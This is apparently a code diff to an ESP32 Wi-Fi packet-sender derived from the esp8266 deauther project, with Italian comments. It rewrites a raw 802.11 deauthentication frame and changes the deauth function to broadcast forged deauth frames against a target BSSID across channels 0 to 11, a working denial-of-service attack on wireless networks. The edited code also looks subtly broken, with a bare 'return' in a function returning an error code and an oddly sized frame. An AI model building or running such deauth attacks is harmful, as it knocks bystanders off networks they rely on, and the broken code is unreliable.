@@ -7,7 +7,7 @@ extern "C" {
 #define TASK_NAME "spam_task"
 
 
-esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
+//esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 
 //packets and code based on
 //https://github.com/spacehuhn/esp8266_deauther/blob/fda01a64861f3e0e8e9379a8e8ed743cb56038f7/esp8266_deauther/Attack.h
@@ -42,13 +42,11 @@ const uint8_t probePacket[] = {
 };
 
 const uint8_t deauthPacket[] = {
-    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
-    /*  2 - 3  */ 0x3A, 0x01,                         // duration
-    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
-    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
-    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
-    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
-    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
+    0xc0, 0x00, 0x3a, 0x01,  //vari header tipo pacchetto c0 -> deauth wifi frame
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //broadcast default
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //bssid del target
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //bssid del target
+    0xf0, 0xff, 0x06, 0x00 //reason code sss
 };
 
 const uint8_t beaconPacket[109] = {
@@ -105,35 +103,25 @@ const uint8_t beaconPacket[109] = {
 esp_err_t PacketSender::deauth(const MacAddr target, const MacAddr source,
         const MacAddr bssid, uint8_t reason, uint8_t channel) {
     
-    ESP_LOGI(TASK_NAME, "(dentro deauth) prima di change_channel");
+    for(uint8_t i = 0; i < 12; i++){
+        esp_err_t res = change_channel(i);
+        if(res != ESP_OK){
+            ESP_LOGI(TASK_NAME, "cannot change to channel %d", i);
+        }
+        memcpy(buffer, deauthPacket, sizeof(deauthPacket));
 
-    esp_err_t res = change_channel(channel);
-    ESP_LOGI(TASK_NAME, "(dentro deauth) dopo change_channel");
+        memcpy(&buffer[10], bssid , 6);
+        memcpy(&buffer[16], bssid, 6);
 
-    if(res != ESP_OK){
-        return res;
+        seqnum++;
+        for(int i=0; i<sizeof(deauthPacket);i++){
+            ESP_LOGI(TASK_NAME, "packet byte %d:  %x ", i, buffer[i]);
+        }
+
+        res = raw(buffer, sizeof(deauthPacket));
+        ESP_LOGI(TASK_NAME, "result: %s", esp_err_to_name(res));
     }
-    memcpy(buffer, deauthPacket, sizeof(deauthPacket));
-
-    memcpy(&buffer[4], target, 6);
-    memcpy(&buffer[10], source , 6);
-    memcpy(&buffer[16], bssid, 6);
-    memcpy(&buffer[22], &seqnum, 2);
-    buffer[24] = reason;
-
-    seqnum++;
-
-    ESP_LOGI(TASK_NAME, "(dentro deauth) prima di raw");
-
-    res = raw(buffer, sizeof(deauthPacket));
-    ESP_LOGI(TASK_NAME, "(dentro deauth) dopo raw()");
-
-    if(res == ESP_OK){
-        return ESP_OK;
-    }
-    return res;
-    //buffer[0] = 0xa0;
-    //return raw(buffer, sizeof(deauthPacket));
+    return ;
 }
 
 esp_err_t PacketSender::beacon(const MacAddr mac, const char* ssid,
